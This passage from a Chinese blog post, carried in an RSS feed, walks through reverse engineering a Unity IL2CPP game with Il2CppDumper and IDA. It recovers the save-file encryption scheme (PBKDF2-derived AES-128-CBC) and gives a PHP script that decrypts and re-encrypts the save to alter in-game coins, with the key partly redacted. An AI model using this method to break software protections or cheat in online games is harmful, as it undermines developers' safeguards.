+<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Input Unity version:
+2018.3
+Initializing metadata...
+Select Mode: 1.Manual 2.Auto 3.Auto(Plus) 4.Auto(Symbol)
+3
+Initializing il2cpp file...
+Applying relocations...
+Searching...
+CodeRegistration : 16e534c
+MetadataRegistration : 16e5384
+Dumping...
+Done !
+Create DummyDll...
+Done !
+Press any key to exit...</pre>
+
+
+
+<p>Il2CppDumper 处理完毕后，可获得 DummyDll、dump.cs 以及 script.py 几个文件。前两个文件包含了分析出的各种类定义，script.py 则是辅助 IDA 分析 .so 文件的。</p>
+
+
+
+<div class="wp-block-image"><figure class="aligncenter is-resized"><img loading="lazy" src="https://coxxs.me/wp-content/uploads/2019/08/image.png" alt="" class="wp-image-1284" width="162" height="83"/></figure></div>
+
+
+
+<p>打开 dump.cs，搜索字符串 prefs.json，很快找到了该字符串所在的类，同时发现了一个疑似密钥的字符串 EK（版权原因，密钥已隐去）。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="507" src="https://coxxs.me/wp-content/uploads/2019/08/image-1-1024x507.png" alt="" class="wp-image-1285" srcset="https://dev.moe/wp-content/uploads/2019/08/image-1-1024x507.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-1-300x149.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-1-768x380.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-1.png 1472w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>EK 长度为 20 字节；而如果看作 Base64，解码后则是 15 字节。无论哪种情况，都不符合 AES、DES、3DES 的密钥长度。将它作为 RC4 的密钥解密存档文件 prefs.json 呢？果然——不行。</p>
+
+
+
+<h2>分析 il2cpp.so </h2>
+
+
+
+<p>乖乖分析代码逻辑吧。用 IDA 打开  libil2cpp.so，Alt+F7 运行刚才生成的 script.py，稍等片刻，定位到对应函数 F5 反编译，就获得了一份有可读性的代码。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="491" src="https://coxxs.me/wp-content/uploads/2019/08/image-3-1024x491.png" alt="" class="wp-image-1287" srcset="https://dev.moe/wp-content/uploads/2019/08/image-3-1024x491.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-3-300x144.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-3-768x369.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-3.png 1738w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>这里从 UserPrefs 类的 Init 函数入手，发现在该函数内，构造了一个用于加解密的类。密钥为 &#8220;Local-&#8221; + Guid + EK。其中的 &#8220;Local-&#8221; + Guid 部分，恰好就是游戏存档文件所在的文件夹名。</p>
+
+
+
+<p>完整的密钥找到了，不过还是不确定加密算法，于是继续分析 CryptoUtility::ctor() 构造函数。</p>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="570" src="https://coxxs.me/wp-content/uploads/2019/08/image-5-1024x570.png" alt="" class="wp-image-1290" srcset="https://dev.moe/wp-content/uploads/2019/08/image-5-1024x570.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-5-300x167.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-5-768x427.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-5.png 1625w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>这里的 AesManaged 和 Rfc2898DeriveBytes 两个类都是 .NET 提供的，这样一来就很清楚了：</p>
+
+
+
+<ol><li>构造 Rfc2898DeriveBytes 类，将刚才传入的 <code>存档文件夹名 + EK</code> 的密钥作为 password，将另一个字串 &#8220;0xa&#8230;..s&#8221; 作为 salt</li><li>AesManaged 默认使用 AES-128-CBC，因此用  Rfc2898DeriveBytes 类生成出一组 IV (16 Bytes) 及 Key  (16 Bytes)。</li><li>对存档进行加解密。</li></ol>
+
+
+
+<h2>加解密程序</h2>
+
+
+
+<p>参考了前人<a rel="noreferrer noopener" aria-label="PHP 中对 .NET 的 Rfc2898DeriveBytes 类的实现 (opens in a new tab)" href="https://medium.com/rabbit-mobile-business-blog/writing-c-s-rfc2898derivebytes-in-php-88fa8c096dcb" target="_blank">在 PHP 中对 .NET 的 Rfc2898DeriveBytes 类的实现</a>，<s>用最好的语言</s>实现了加解密程序：</p>
+
+
+
+<pre class="EnlighterJSRAW" data-enlighter-language="php" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;?php
+
+class SymmetricEncryption {
+    private $cipher;
+    public function __construct($cipher = 'aes-128-cbc') {
+        $this->cipher = $cipher;
+    }
+    private function getKeySize() {
+        if (preg_match("/([0-9]+)/i", $this->cipher, $matches)) {
+            return $matches[1] >> 3;
+        }
+        return 0;
+    }
+    function derived($password, $salt) {
+        $AESKeyLength = $this->getKeySize();
+        $AESIVLength = openssl_cipher_iv_length($this->cipher);
+        $pbkdf2 = hash_pbkdf2("SHA1", $password, $salt, 1000, $AESKeyLength + $AESIVLength, TRUE);
+        $key = substr($pbkdf2, 0, $AESKeyLength);
+        $iv =  substr($pbkdf2, $AESKeyLength, $AESIVLength);
+        $derived = new stdClass();
+        $derived->key = $key;
+        $derived->iv = $iv;
+        return $derived;
+    }
+    function encrypt($message, $password, $salt) {
+        $derived = $this->derived($password, $salt);
+        $enc = openssl_encrypt($message, $this->cipher, $derived->key, OPENSSL_RAW_DATA, $derived->iv);
+        return $enc;
+    }
+    function decrypt($message, $password, $salt) {
+        $derived = $this->derived($password, $salt);
+        $dec = openssl_decrypt($message, $this->cipher, $derived->key, OPENSSL_RAW_DATA, $derived->iv);
+        return $dec;
+    }
+}
+
+$name = 'Local-db23521a-d1ea-2197-8640-f112c7f9ced9';
+$password = $name.'8C................2l'; // 版权原因，隐去一部分
+$salt = '0x.........s';
+
+// decrypt
+$file = file_get_contents('prefs.json.encrypted');
+$file = substr($file, 2); // 去除文件头
+$se = new SymmetricEncryption();
+$decrypted = $se->decrypt($file, $password, $salt);
+
+// encrypt
+$file = file_get_contents('prefs.json');
+$file = $se->encrypt($file, $password, $salt);
+$encrypted = 'EN'.$file; // 加上文件头</pre>
+
+
+
+<figure class="wp-block-image"><img loading="lazy" width="1024" height="408" src="https://coxxs.me/wp-content/uploads/2019/08/image-6-1024x408.png" alt="" class="wp-image-1291" srcset="https://dev.moe/wp-content/uploads/2019/08/image-6-1024x408.png 1024w, https://dev.moe/wp-content/uploads/2019/08/image-6-300x120.png 300w, https://dev.moe/wp-content/uploads/2019/08/image-6-768x306.png 768w, https://dev.moe/wp-content/uploads/2019/08/image-6.png 1555w" sizes="(max-width: 1024px) 100vw, 1024px" /><figcaption>解密后的存档文件</figcaption></figure>
+
+
+
+<h2>尾声与思考</h2>
+
+
+
+<p>这游戏的变态之处绝不仅是用 Rfc2898DeriveBytes 和 AES 给存档加密.. 改完存档浪了几分钟，发现金币又归零了。</p>
+
+
+
+<p>再次分析，发现这游戏把所有获得金币、经验、道具的事件都加了一个 ID，每次获得物品都会把对应的事件 ID 放到队列里，并择机上报给服务器；同理，消耗物品也会上报。<strong>猜测</strong>服务器其实也维护了一份物品数据，如果游戏发现与服务器数据差别过大就会加载服务器的数据。于是只好禁止游戏联网玩了。</p>
+
+
+
+<p>或许比起修改存档，把消耗金币的代码取消掉才是更正确的选择。不过修改 .so 与打包游戏又是另一个故事了。</p>
+
+
+
+<p><strong>Coxxs</strong></p>
+<p><a rel="nofollow" href="https://dev.moe/1282">记一次 Unity IL2CPP 游戏逆向</a>最先出现在<a rel="nofollow" href="https://dev.moe">Coxxs</a>。</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://dev.moe/1282/feed</wfw:commentRss>
+			<slash:comments>3</slash:comments>
+		
+		
+		<post-id xmlns="com-wordpress:feed-additions:1">1282</post-id>	</item>
+	</channel>
+</rss>
